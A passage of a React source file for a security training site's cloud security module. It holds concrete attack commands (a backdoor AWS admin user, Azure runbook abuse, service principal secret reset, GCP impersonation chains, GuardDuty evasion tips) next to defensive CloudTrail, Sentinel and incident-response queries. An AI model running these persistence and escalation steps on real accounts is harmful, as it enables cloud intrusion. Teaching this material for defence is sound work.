  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# CREATING PERSISTENCE - BACKDOOR IAM USER
# After escalation, create a new admin user as a backdoor:
aws iam create-user --user-name support-bot
aws iam attach-user-policy --user-name support-bot \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support-bot`}</Pre>

        <H3>Azure Lateral Movement</H3>
        <Pre label="// AZURE LATERAL MOVEMENT AND ESCALATION">{`# SUBSCRIPTION HOPPING
# Users/service principals may have access to multiple subscriptions
# From compromised context:
az account list --all    # list all subscriptions the identity can access
az account set --subscription TARGET_SUBSCRIPTION_ID
az resource list         # now enumerating different subscription

# RESOURCE GROUP ACCESS
# Owner of one resource group can modify resources affecting other groups
# e.g., shared networking RG, shared Key Vault with secrets for all environments

# MANAGED IDENTITY CHAINS
# VM A has Managed Identity with Contributor on Subscription
# VM B has Managed Identity with Read access to Key Vault containing secrets
# From VM A: access Key Vault (via Contributor -> add access policy)
# From VM A: read secrets meant for VM B

# AZURE AUTOMATION RUNBOOK ABUSE
# Azure Automation accounts run PowerShell/Python runbooks with a RunAs identity
# If you can create/modify runbooks:
# - Create a runbook that exfils credentials or creates backdoor admin
# - Publish and run it: it executes as the Automation account's identity
az automation runbook create --automation-account-name AUTOMATION_ACCOUNT \
  --resource-group RESOURCE_GROUP --name backdoor --type PowerShell
# Then publish and invoke

# SERVICE PRINCIPAL CLIENT SECRET ROTATION
# If you have Application.ReadWrite.All or can manage a specific app:
az ad app credential reset --id APP_CLIENT_ID
# Returns new client_secret - now you can authenticate as that service principal
# If the SP has Contributor or Owner roles, you have lateral movement`}</Pre>

        <H3>Cloud to On-Premises and On-Prem to Cloud Pivots</H3>
        <Pre label="// HYBRID ENVIRONMENT ATTACK PATHS">{`# CLOUD TO ON-PREM (Azure AD Connect):
# Azure AD Connect syncs on-prem Active Directory to Azure AD
# The MSOL_XXXXXXXX service account (created by AzureAD Connect) has:
#   - Replication rights on the on-prem domain
#   - DCSync capability -> extract all AD hashes
# If you compromise Azure -> get creds for MSOL account -> DCSync on-prem AD

# ON-PREM TO CLOUD (Azure AD SSO):
# Hybrid Azure AD joined machines get PRTs (Primary Refresh Tokens)
# Stealing a PRT from a domain-joined workstation provides Azure AD SSO
# No Azure AD password needed - the PRT proves device registration
# Use Mimikatz sekurlsa::cloudap to dump PRT
# Then use ROADtoken or AADInternals to leverage the PRT

# ADFS (Active Directory Federation Services):
# Organizations using ADFS can forge SAML tokens if they have the ADFS signing key
# Extract ADFS signing certificate with Golden SAML attack:
# Get-ADFSProperties | Select-Object SigningCertificate (requires ADFS server access)
# With signing cert, mint SAML token for any user in the tenant
# This is the cloud equivalent of a Golden Ticket

# CROSS-CLOUD VIA SHARED CREDENTIALS:
# Developers with access to both AWS and GCP may store credentials together
# CI/CD pipelines may have environment variables for both platforms
# GitHub Actions workflows may have both AWS_SECRET_ACCESS_KEY and GCP SA keys
# Compromise CI/CD = access to all cloud platforms it deploys to`}</Pre>

        <H3>GCP Service Account Impersonation Chains</H3>
        <Pre label="// GCP LATERAL MOVEMENT VIA SA IMPERSONATION">{`# SERVICE ACCOUNT IMPERSONATION:
# If SA-A has iam.serviceAccounts.actAs on SA-B, it can act as SA-B
# Create a chain: SA-A (low priv) -> impersonate SA-B (medium) -> impersonate SA-C (admin)

# Impersonate a service account:
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com
# Returns access token for TARGET_SA - use for subsequent API calls

# Or configure gcloud to use impersonation:
gcloud config set auth/impersonate_service_account TARGET_SA@PROJECT.iam.gserviceaccount.com
gcloud projects get-iam-policy PROJECT_ID   # runs as impersonated SA

# Enumerate who can impersonate which service accounts:
gcloud iam service-accounts get-iam-policy SA_EMAIL@PROJECT.iam.gserviceaccount.com
# Look for: roles/iam.serviceAccountTokenCreator or roles/iam.serviceAccountUser
# These roles = can impersonate this SA

# Project hopping:
# Service accounts exist per project but can have IAM bindings in other projects
gcloud projects list --filter="labels.environment:production"
# For each project, check if your current SA has any bindings:
gcloud projects get-iam-policy OTHER_PROJECT_ID --format=json | grep CURRENT_SA_EMAIL`}</Pre>
      </div>
    ),
  },

  {
    id: 'cs-08',
    title: 'Cloud Detection and Incident Response',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    labLink: '/modules/cloud-security/lab',
    takeaways: [
      'CloudTrail logs are the forensic ground truth for AWS incidents - immediately export and preserve them to S3 before an attacker can disable or tamper with logging',
      'AWS Athena allows you to query CloudTrail logs with SQL, enabling rapid threat hunting across millions of events without downloading log files manually',
      'Incident response in AWS means isolating resources by removing IAM permissions and detaching security groups, not by shutting down instances (which destroys forensic evidence)',
      'Prowler provides 200+ security checks across AWS, Azure, and GCP mapped to compliance frameworks - run it as the first step in any cloud security assessment',
      'KQL (Kusto Query Language) in Microsoft Sentinel enables powerful threat hunting across Azure AD sign-in logs, resource activity logs, and connected data sources',
    ],
    content: (
      <div>
        <P>Cloud incident response requires different skills and tooling compared to traditional IR. You cannot image a hard drive or capture memory from a serverless function. Instead, you query control plane logs (CloudTrail, Azure Activity Log), analyse flow logs, and preserve evidence through snapshots. Speed is critical because cloud attackers move fast and can destroy evidence in seconds.</P>

        <H3>AWS CloudTrail - Threat Hunting with Athena</H3>
        <Pre label="// CLOUDTRAIL ATHENA QUERIES FOR THREAT HUNTING">{`-- Set up Athena table for CloudTrail logs
-- CloudTrail logs are stored in S3 in JSON format
-- Create Athena table pointing to your CloudTrail S3 bucket

-- Find all IAM changes in the last 24 hours:
SELECT eventtime, useridentity.arn, eventname, sourceipaddress, requestparameters
FROM cloudtrail_logs
WHERE eventtime > to_iso8601(current_timestamp - interval '24' hour)
  AND eventsource = 'iam.amazonaws.com'
ORDER BY eventtime DESC;

-- Find ConsoleLogin events from unusual IPs:
SELECT eventtime, useridentity.username, sourceipaddress, useragent,
       json_extract(responseelements, '$.ConsoleLogin') as login_result
FROM cloudtrail_logs
WHERE eventname = 'ConsoleLogin'
  AND eventtime > to_iso8601(current_timestamp - interval '7' day)
ORDER BY eventtime DESC;

-- Detect role assumption activity (cross-account especially):
SELECT eventtime, useridentity.arn, requestparameters, responseelements,
       sourceipaddress
FROM cloudtrail_logs
WHERE eventname = 'AssumeRole'
  AND eventtime > to_iso8601(current_timestamp - interval '24' hour);

-- Find GetSecretValue calls (secrets access):
SELECT eventtime, useridentity.arn, requestparameters, sourceipaddress
FROM cloudtrail_logs
WHERE eventname = 'GetSecretValue'
ORDER BY eventtime DESC;

-- Detect CloudTrail disabling (critical alert):
SELECT eventtime, useridentity.arn, sourceipaddress, requestparameters
FROM cloudtrail_logs
WHERE eventname IN ('StopLogging', 'DeleteTrail', 'UpdateTrail')
ORDER BY eventtime DESC;

-- Find new IAM user creation:
SELECT eventtime, useridentity.arn, requestparameters, sourceipaddress
FROM cloudtrail_logs
WHERE eventname = 'CreateUser'
  AND eventtime > to_iso8601(current_timestamp - interval '7' day);

-- Detect S3 bucket made public:
SELECT eventtime, useridentity.arn, requestparameters, sourceipaddress
FROM cloudtrail_logs
WHERE eventname IN ('PutBucketAcl', 'PutBucketPolicy')
  AND eventtime > to_iso8601(current_timestamp - interval '7' day);`}</Pre>

        <H3>AWS GuardDuty and Security Hub</H3>
        <Pre label="// GUARDDUTY FINDINGS AND RESPONSE">{`# GuardDuty finding types relevant to attacks:
# UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
#   -> Console login from TOR exit node or unusual country
# Discovery:S3/MaliciousIPCaller
#   -> S3 API called from known malicious IP
# Recon:IAMUser/UserPermissions
#   -> IAM enumeration activity detected
# PrivilegeEscalation:IAMUser/AdministrativePermissions
#   -> Granting of admin permissions to user
# Persistence:IAMUser/UserPermissions
#   -> New user/access key created after period of inactivity
# UnauthorizedAccess:EC2/SSHBruteForce
#   -> SSH brute force against EC2 instances
# CryptoCurrency:EC2/BitcoinTool.B
#   -> Crypto mining detected on EC2
# Trojan:EC2/DNSDataExfiltration
#   -> DNS-based data exfiltration pattern

# GuardDuty evasion (defender awareness):
# IP-based findings are evaded by using victim account's VPC
# User agent spoofing: --cli-ua-suffix can change user agent
# Slow enumeration: staying under volume thresholds
# Using legitimate AWS services for C2 (SQS, S3, DynamoDB)

# Security Hub - aggregated findings:
aws securityhub get-findings \
  --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}' \
  --query 'Findings[*].[Title,Description,Resources]'

# AWS Config - track configuration changes:
aws configservice describe-configuration-recorders
aws configservice get-compliance-summary-by-config-rule
# Config rules check: MFA enabled, CloudTrail on, no public S3, etc.`}</Pre>

        <H3>Azure Sentinel KQL Threat Hunting</H3>
        <Pre label="// MICROSOFT SENTINEL KQL QUERIES">{`// Azure AD risky sign-ins (unusual location/IP):
SigninLogs
| where TimeGenerated > ago(24h)
| where RiskLevel in ("medium", "high")
| project TimeGenerated, UserPrincipalName, IPAddress, Location, RiskState, RiskDetail
| order by TimeGenerated desc

// Detect impossible travel (sign-ins from 2 far-apart locations quickly):
SigninLogs
| where TimeGenerated > ago(24h)
| project TimeGenerated, UserPrincipalName, IPAddress, Location
| order by UserPrincipalName, TimeGenerated asc
| extend PrevLocation = prev(Location, 1), PrevTime = prev(TimeGenerated, 1), PrevUser = prev(UserPrincipalName, 1)
| where UserPrincipalName == PrevUser and Location != PrevLocation
| where datetime_diff('minute', TimeGenerated, PrevTime) < 60

// Azure resource permission changes:
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName contains "Add member to role"
     or OperationName contains "Update role"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources

// Key Vault secret access:
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName == "SecretGet"
| project TimeGenerated, CallerIPAddress, identity_claim_oid_g, requestUri_s

// Detect new OAuth app consent grants:
AuditLogs
| where OperationName == "Consent to application"
| project TimeGenerated, TargetResources, InitiatedBy, AdditionalDetails`}</Pre>

        <H3>AWS Incident Response - Isolation and Evidence Preservation</H3>
        <Pre label="// AWS IR PLAYBOOK">{`# STEP 1: IDENTIFY affected resources
aws sts get-caller-identity    # who is the compromised identity?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=COMPROMISED_USER \
  --start-time 2024-01-01T00:00:00Z

# STEP 2: CONTAIN - isolate the identity (do NOT delete - preserve evidence)
# Revoke all active sessions immediately:
aws iam put-user-policy --user-name COMPROMISED_USER --policy-name quarantine \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}'

# Revoke temporary credentials (STS sessions):
aws iam attach-user-policy --user-name COMPROMISED_USER \
  --policy-arn arn:aws:iam::aws:policy/AWSDenyAll

# Isolate EC2 instance (do NOT stop/terminate - destroys memory):
# Create isolated security group allowing NO traffic:
aws ec2 create-security-group --group-name quarantine --description "Isolated"
# Remove all rules, then replace instance's security groups:
aws ec2 modify-instance-attribute --instance-id INSTANCE_ID \
  --groups QUARANTINE_SG_ID

# STEP 3: PRESERVE EVIDENCE
# Export CloudTrail logs before they can be tampered:
aws cloudtrail get-trail-status --name TRAIL_NAME
aws s3 sync s3://CLOUDTRAIL_BUCKET/ ./ir-evidence/cloudtrail/

# Create EBS volume snapshot for forensic analysis:
aws ec2 create-snapshot --volume-id VOLUME_ID \
  --description "IR evidence - incident 2024-01-01"

# Export VPC Flow Logs:
aws ec2 describe-flow-logs --filter Name=resource-id,Values=VPC_ID

# STEP 4: ANALYSE
# Query CloudTrail in Athena for all activity by compromised identity
# Analyse VPC Flow Logs for lateral movement / exfiltration
# Check S3 access logs for data exfiltration volumes

# STEP 5: ERADICATE AND RECOVER
# Delete compromised access keys and create new ones
# Rotate all secrets potentially exposed (Secrets Manager)
# Review and remediate IAM policies that enabled the attack
# Enable GuardDuty, Security Hub if not already running
# Enforce MFA on all IAM users`}</Pre>

        <H3>Multi-Cloud Security Assessment Tools</H3>
        <Pre label="// COMPREHENSIVE CLOUD SECURITY TOOLS">{`# Prowler - AWS/Azure/GCP security assessment
pip3 install prowler
prowler aws --checks s3_bucket_public_access --severity critical high
prowler azure --subscription-ids SUB_ID
prowler gcp --project-ids PROJECT_ID

# ScoutSuite - multi-cloud audit HTML report
pip3 install scoutsuite
# AWS:
scout aws --report-dir ./scout-aws/
# Azure:
scout azure --cli --report-dir ./scout-azure/
# GCP:
scout gcp --report-dir ./scout-gcp/ --project PROJECT_ID

# CloudMapper - AWS network visualization
pip3 install cloudmapper
# Configure AWS account, then:
python3 cloudmapper.py prepare --config config.json --account ACCOUNT_ID
python3 cloudmapper.py webserver
# Opens interactive network map showing all VPCs, subnets, security groups

# Steampipe - SQL queries over cloud APIs
brew install steampipe
steampipe plugin install aws azure gcp
steampipe query "select name, region, public_access_block_enabled from aws_s3_bucket"
steampipe query "select display_name, user_type from azuread_user where account_enabled=true"

# CloudFox - attack surface enumeration (Bishop Fox)
cloudfox aws -p PROFILE all-checks --output-directory ./cloudfox-results/
# Finds: exposed endpoints, exploitable IAM roles, secrets, instance profiles`}</Pre>

        <H3>GCP Cloud Audit Log Analysis</H3>
        <Pre label="// GCP AUDIT LOG THREAT HUNTING">{`# GCP Audit Log types:
# Admin Activity: always on, free - IAM changes, resource creation/deletion
# Data Access: off by default, paid - who read what data
# System Events: auto-generated - no user action required

# Query audit logs with gcloud:
gcloud logging read "logName=projects/PROJECT_ID/logs/cloudaudit.googleapis.com/activity \
  AND protoPayload.methodName=SetIamPolicy" \
  --format=json --limit=100

# Find new service account key creation (persistence indicator):
gcloud logging read "protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey" \
  --format=json --project PROJECT_ID

# Find who accessed Cloud Storage (if Data Access logging enabled):
gcloud logging read "logName=projects/PROJECT_ID/logs/cloudaudit.googleapis.com/data_access \
  AND protoPayload.serviceName=storage.googleapis.com" \
  --format=json --limit=50

# Find IAM policy bindings added at org level:
gcloud logging read "protoPayload.methodName=SetIamPolicy \
  AND protoPayload.resourceName:organization" \
  --organization ORG_ID --format=json

# Using BigQuery for log analysis at scale:
# Export logs to BigQuery, then query with SQL:
# SELECT protopayload_auditlog.authenticationinfo.principalemail,
#        protopayload_auditlog.methodname,
#        timestamp
# FROM PROJECT_ID.audit_logs.cloudaudit_googleapis_com_activity
# WHERE protopayload_auditlog.methodname LIKE 'google.iam%'
# ORDER BY timestamp DESC
# LIMIT 1000`}</Pre>
      </div>
    ),
  },
]

export default function CloudSecurity() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#6a4a2a' }}>
        <Link href="/" style={{ color: '#6a4a2a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>MOD-09 // CLOUD SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(255,149,0,0.08)', border: '1px solid rgba(255,149,0,0.3)', borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,149,0,0.1)', border: '1px solid rgba(255,149,0,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a4a2a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 09 - CONCEPT PAGE</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,149,0,0.35)' }}>CLOUD SECURITY</h1>
        <p style={{ color: '#6a4a2a', fontFamily: mono, fontSize: '0.75rem' }}>AWS IAM exploitation - S3 misconfigs - IMDS attacks - Azure AD - GCP service accounts - Kubernetes escapes - IaC security - Cloud IR</p>
      </div>

      {/* Module nav */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '2.5rem', flexWrap: 'wrap' }}>
        <Link href="/modules/network-attacks" style={{ fontFamily: mono, fontSize: '0.65rem', color: '#5a4a3a', textDecoration: 'none', padding: '4px 12px', border: '1px solid #2a1a00', borderRadius: '3px' }}>
          &#8592; MOD-08 NETWORK ATTACKS
        </Link>
        <Link href="/modules/social-engineering" style={{ fontFamily: mono, fontSize: '0.65rem', color: '#5a4a3a', textDecoration: 'none', padding: '4px 12px', border: '1px solid #2a1a00', borderRadius: '3px', marginLeft: 'auto' }}>
          MOD-10 SOCIAL ENGINEERING &#8594;
        </Link>
      </div>

      {/* Codex */}
      <ModuleCodex moduleId="cloud-security" accent={accent} chapters={chapters} />
    </div>
  )
}
